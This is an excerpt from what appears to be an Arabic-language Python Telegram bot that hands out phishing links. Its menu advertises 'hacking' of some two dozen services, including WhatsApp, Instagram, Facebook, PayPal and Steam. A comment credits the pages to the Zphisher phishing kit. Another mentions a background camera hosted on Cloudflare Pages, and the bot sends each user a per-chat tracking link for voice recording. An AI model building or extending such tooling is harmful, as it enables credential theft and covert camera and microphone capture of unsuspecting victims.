...
# روابط الصفحات (Vercel) + كاميرا خلفية على Cloudflare Pages
...
LINK_DATA = "https://yahya-pages.pages.dev/data.html"
...
def build_main_menu():
    ...
    pairs = [
        ...
        ("اختراق تيك توك 🎵", "get_tiktok"),
        ("اختراق واتساب 💬", "get_whatsapp"),
        ("اختراق انستجرام 📸", "get_instagram"),
        ("اختراق فيسبوك 👍", "get_facebook"),
        ("اختراق سناب شات 👻", "get_snapchat"),
        ("اختراق يوتيوب ▶️", "get_youtube"),
        ("اختراق تويتر 🐦", "get_twitter"),
        ("اختراق ببجي 🎯", "get_pubg"),
        ("اختراق فري فاير 🔫", "get_freefire"),
        ("اختراق قوقل 🔍", "get_google"),
        ("اختراق باي بال 💳", "get_messenger"),
        ("اختراق كواي 🎬", "get_kwai"),
        ("اختراق نتفليكس 🎬", "get_netflix"),
        ("اختراق ديسكورد 💻", "get_discord"),
        ("اختراق روبلكس 🎮", "get_roblox"),
        ("اختراق لينكدإن 💼", "get_linkedin"),
        ("اختراق سبوتيفاي 🎧", "get_spotify"),
        ("اختراق تويتش 📺", "get_twitch"),
        ("اختراق ستيم 🎮", "get_steam"),
        ("اختراق مايكروسوفت 🪟", "get_microsoft"),
        ("اختراق ياهو 📧", "get_yahoo"),
    ]
    markup = InlineKeyboardMarkup(row_width=2)
...
def callback_query(call):
    ...
    if call.data == "get_link_num": 
    ...
    elif call.data == "get_record_voice": 
        ...
        bot.send_message(chat_id, f"{LINK_DATA}?id={chat_id}")
    ...
    # ===== صفحات اختراق السوشل ميديا من Zphisher =====
        ...
        markup.add(InlineKeyboardButton("@GetContcatbot", url="https://t.me/GetContcatbot", style="success"))
